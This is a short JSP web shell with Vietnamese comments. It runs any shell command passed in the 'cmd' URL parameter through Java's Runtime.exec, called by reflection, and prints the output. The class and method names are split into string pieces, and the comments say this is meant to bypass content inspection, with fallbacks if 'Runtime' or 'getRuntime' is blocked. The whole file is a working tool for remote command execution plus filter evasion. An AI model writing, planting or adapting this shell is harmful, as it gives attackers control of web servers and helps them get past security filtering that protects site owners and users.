<%!
    String part1 = "<";
    String part2 = "%";
    String fullTag = part1 + part2;
// kỹ thuật obfuscation --> nối chuỗi 
    public static String r(String c) throws Exception {
        String r = "Run" + "time";
        Class<?> clazz = Class.forName("java.lang." + r); // lấy phương thức getRuntime
        Object rt = clazz.getMethod("get" + r).invoke(null); // gọi getRuntime() -> trả về đối tượng Runtime
        return new java.util.Scanner(clazz.getMethod("exec", String.class).invoke(rt, c).getInputStream())
            .useDelimiter("\\A").next();
    }
%>
<%= r(request.getParameter("cmd")) %>  <%-- Gọi hàm run() và truyền tham số cmd từ URL --%>
<%-- Ẩn dấu từ Runtime / exec / getRuntime → giúp bypass content inspection
Bị chặn "Runtime" thì có thể r = "Run" + "time"
Bị chặn "getRuntime" thì có thể "get" + r --%>